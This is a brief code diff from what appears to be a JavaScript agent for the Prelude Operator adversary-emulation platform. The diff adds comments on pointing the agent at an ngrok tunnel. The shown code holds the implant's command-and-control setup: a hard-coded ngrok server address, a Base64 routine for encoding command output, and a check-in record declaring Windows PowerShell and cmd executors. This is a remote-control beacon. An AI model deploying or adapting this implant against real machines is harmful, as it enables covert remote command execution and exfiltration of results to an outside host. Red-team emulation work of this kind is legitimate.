@@ -13,7 +13,10 @@ var myGuid = guid.substring(1,guid.length-2);
 	var Base64={characters:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(a){Base64.characters;var r="",c=0;do{var e=a.charCodeAt(c++),t=a.charCodeAt(c++),h=a.charCodeAt(c++),s=(e=e||0)>>2&63,A=(3&e)<<4|(t=t||0)>>4&15,o=(15&t)<<2|(h=h||0)>>6&3,B=63&h;t?h||(B=64):o=B=64,r+=Base64.characters.charAt(s)+Base64.characters.charAt(A)+Base64.characters.charAt(o)+Base64.characters.charAt(B)}while(c<a.length);return r}};
 // We'll base64 endode /decode stdout to stay sane. :)
 
-var prelude_operator_server = 'https://boomtown.ngrok.io';
+var prelude_operator_server = 'https://boomtown.ngrok.io'; // Update with your ngrok instance
+// ngrok http 3391 
+// This will return you unique url.
+
 var JSONCheckin =  '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[]}'
 
 function sleep_for(count)  // TODO Align with JSON Sleep:
